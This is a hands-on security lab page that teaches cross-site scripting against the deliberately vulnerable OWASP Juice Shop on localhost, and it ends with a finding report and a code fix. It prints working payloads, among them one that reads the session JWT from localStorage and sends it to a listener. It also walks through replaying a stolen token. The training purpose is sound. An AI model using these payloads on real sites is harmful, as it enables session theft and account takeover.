1. What XSS Really Is · foundation

🪱
October 2005: one profile takes down MySpace

Samy Kamkar put a little JavaScript on his MySpace profile. When anyone viewed it, the script ran in their browser, added Samy as their friend, stuck "but most of all, samy is my hero" on their page, and copied itself onto their profile. Now their profile infected the next visitor. It hit over a million accounts in under 20 hours and MySpace had to pull the site offline.

He didn't break into a server. He just got his code to run in other people's browsers on a page they trusted. That's the whole idea of XSS, and it still runs the modern web's worst days.

What you see on screen is the DOM: the browser takes the HTML text the server sends, parses it into a live tree of elements, and runs any script attached to them. Here's the catch. It can't tell apart JavaScript the developer wrote from JavaScript you smuggled into a comment box. So the whole game is whether your text lands in that tree as words (just sits there) or as code (yours, and it runs).

SAME INPUT, TWO OUTCOMES

App escapes it → words

safe 
you type:   <img src=x onerror=alert(1)>
page shows: <img src=x onerror=alert(1)>
  • 🔒 It lands as plain text. The browser prints the characters and nothing runs.

App doesn't → code

XSS 
you type:     <img src=x onerror=alert(1)>
browser runs: alert(1)   🔔
  • 💥 It lands as a real element. The broken image fires its onerror, and your code runs.

Same characters both times. The only thing that changed is whether the app escaped them before writing them into the page. That one choice is the entire bug.

🤔 Say your JavaScript is now running on a page where the victim is logged in. You get one grab. What do you take, and where is it kept so your script can reach it?
Answer

The session. Once you're logged into Juice Shop, the server hands back a token (a JWT) that proves who you are. Steal that token and you don't need the password, you are that user. The catch is where the token sits, because that decides whether your script can read it.

Where Juice Shop keeps your session

Log in, then open DevTools and look. The token shows up in localStorage, and any JavaScript on the page can read it:

DevTools Console · logged into Juice Shop 
> localStorage.getItem('token')
"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9…"   // your whole session, in plain reach

> document.cookie
"language=en"                             // the session isn't even in here

A cookie can hide from JS

HttpOnly
  • 🍪 A session cookie marked HttpOnly is invisible to JavaScript, so XSS can't read it out and replay it elsewhere. It can still act as you inside the page, but it can't walk off with the cookie.

localStorage can't

no such flag
  • 📖 There is no HttpOnly for localStorage. A token kept there is readable by any script on the origin, full stop. Juice Shop does exactly this, so XSS means instant session theft.
"Isn't localStorage the modern, better way to store a token?"

It's common, and it dodges one class of attack (CSRF). But it trades that for this one: anything XSS can run can read it. The honest answer the industry lands on is that if you have XSS, you've mostly lost either way, so the real fix is not shipping XSS in the first place. That's the rest of this lab.

2. Three Flavors of XSS

Same bug every time (your code runs on a trusted page), but it gets delivered three different ways. The only difference is where the payload lives and who ends up running it.

Reflected

needs a lure
  • 🎣 Payload rides in a link or form. The server bounces it straight back into the page.
  • 👤 Only hits whoever clicks your crafted link. One victim at a time.

Stored

the worst one
  • 💾 Payload is saved on the server (a comment, a profile, a review).
  • 👥 Runs for every visitor, no link needed. This is the Samy worm.

DOM

client-side only
  • 🖥️ The page's own JavaScript takes something from the URL and writes it to the page.
  • 🕳️ The payload may never touch the server. That's the one you'll land first.

🤔 You're about to type <img src=x onerror=alert(document.domain)> into the search box. The image source x doesn't exist. So what happens? Write your guess first.
Answer

The page builds a real <img> element from your text. The browser tries to load x, fails, and fires the onerror handler you attached. Your JavaScript runs. The "broken image" is the whole point, it's just a reliable way to make your code fire.

🟢 Baseline · everyone gets this

  1. Click the search icon (top bar) so the search box opens.
  2. Type exactly: <img src=x onerror=alert(document.domain)>
  3. Press Enter. A popup fires showing localhost. That popup is your code running on their page.
Nothing popped?

Press F12 → Elements and search the page for searchValue. If your <img> shows up there as a real element (not as grey text), the injection landed and the onerror should have fired. If it shows as plain text, you're on a build that escapes it, try the search route directly: http://localhost:3000/#/search?q=<img src=x onerror=alert(1)>.

Some browsers block repeat alerts. Reload and fire it once.

🖥️
Why this one is "DOM" XSS

Remember from Lab 03: the server's search API gets an empty q. Your payload never reaches the backend. It's the page's own JavaScript that reads your text and writes it into the heading. The whole attack happens in the browser, which is exactly what makes it DOM-based.

4. Make It Hurt: Steal the Session · exploit

A popup proves you can run code. Nobody pays for a popup. The real move is what your code does next, and from §1 you already know where the session lives: localStorage, in plain reach.

🟡 Stretch · steal the session

  1. Log in first (any account, or the Lab 03 bypass) so there's a token to take.
  2. You've already got both halves: the <img src=x onerror=...> shell from §3, and the one line that reads the token from §1. Fill the blank, then search it: 
    <img src=x onerror="alert( ______ )">
  3. The popup shows the full JWT. Copy it. That string is the session.
  4. Open a fresh Incognito window at http://localhost:3000 (nobody logged in there). Open DevTools → Console and run: 
    localStorage.setItem('token', '<PASTE_THE_JWT>')
  5. Reload the page. You're logged in as that user. No password, no login form. That's the attack, start to finish.
Stuck on the blank?

It's the exact line from §1 that reads the token: localStorage.getItem('token'). So the full payload is <img src=x onerror="alert(localStorage.getItem('token'))">.

what the popup shows · the victim's live session
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ...   // their whole JWT, paste it anywhere to become them

🔴 Going Pro · ship it off the machine

A popup only proves it to you. A real attacker sends the token somewhere they control, with no popup for the victim to notice. You can run this end to end right now: start a listener on your own machine, then fire the payload. 

# 1) your listener (your own machine, new terminal)
python3 -m http.server 9000

# 2) the payload, searched on Juice Shop
<img src=x onerror="new Image().src='http://localhost:9000/?c='+localStorage.getItem('token')">

Watch your terminal. A GET /?c=eyJ... line appears with the token glued on, no popup, nothing for the victim to see. On a real engagement that listener is a box on the internet or Burp Collaborator, not localhost.

Two things that make this worse than the textbook version

No CSP. Juice Shop sends no Content-Security-Policy header (check it: curl -I http://localhost:3000). That's why your inline onerror ran at all. A strict CSP would block inline handlers, and getting past one is the pro skill you'll meet in the PortSwigger ladder and BSCP.

HttpOnly can't save this. The one flag that hides a cookie from JavaScript does nothing here, because the token isn't in a cookie. It's in localStorage, which no flag protects. That's the real lesson: where you store a session decides what XSS can take.

🤔 In that 🔴 lab your input reflects inside an attribute, and angle brackets come back HTML-encoded, so you can't open a new tag: 
<input type="text" value="YOUR_INPUT">
<img> and <svg> are off the table here. So how do you still get code to run? Guess before you climb.
Answer

You don't need a new tag. The double quote isn't encoded, so you close the value=" and bolt your own event handler straight onto the input, something like onmouseover or autofocus onfocus. Working out the exact string is the lab. The move to keep: when you can't open a tag, break out of the attribute instead.

🧠
Filter bypass is most of the real job

When <script> is blocked you change shape: an event handler, a different tag, or breaking out of the attribute you landed in. The easy labs prove you understand XSS. This one proves you can still land it when the app fights back.

6. Write the Finding · document

Same rule as last lab: the report is the deliverable. Turn today's XSS into one clean finding.

📓 FINDING · Cross-Site Scripting in product search severity: High
TitleDOM-based XSS in the product search, enabling session token theft
SeverityHigh · CVSS 7.1 (needs a user to open a crafted link; then full session takeover)
Affected endpointClient-side search sink, /#/search?q= (rendered into #searchValue as raw HTML)
Steps to reproduce1. Search <img src=x onerror=alert(document.domain)> → script executes. 2. Swap in <img src=x onerror="alert(localStorage.getItem('token'))"> → the session JWT is readable by script and can be exfiltrated. 3. No CSP is present to block inline handlers.
ImpactAny user who opens a crafted search link runs attacker JavaScript in their session. The token lives in localStorage (no HttpOnly protection), so it can be stolen outright, leading to full account takeover.
RemediationEncode output / let the framework escape it (don't call bypassSecurityTrustHtml on user input). Add a strict Content-Security-Policy. Keep session tokens in HttpOnly cookies, not localStorage.

CVSS is lower than last week's SQLi because XSS here needs a victim to click. "Reads the whole DB with no login" (9.8) beats "needs a click" (7.1). You'll score these properly in Week 13.

The fix, side by side

💥 Vulnerable

trust bypassed 
// Angular normally escapes for you.
// Juice Shop turns that OFF:
this.searchValue =
  this.sanitizer
    .bypassSecurityTrustHtml(query);
// raw user input, rendered as HTML

✅ Fixed

escaped 
// Just let the framework do its job.
this.searchValue = query;
// bound with {{ }} / [textContent],
// so < and > become harmless text

The whole bug is one call that told the framework "trust this, don't escape it." Modern frameworks escape output by default. The fix is almost always to stop fighting them. Blacklisting the word script is not a fix, you saw in the 🔴 lab how many ways around that there are.
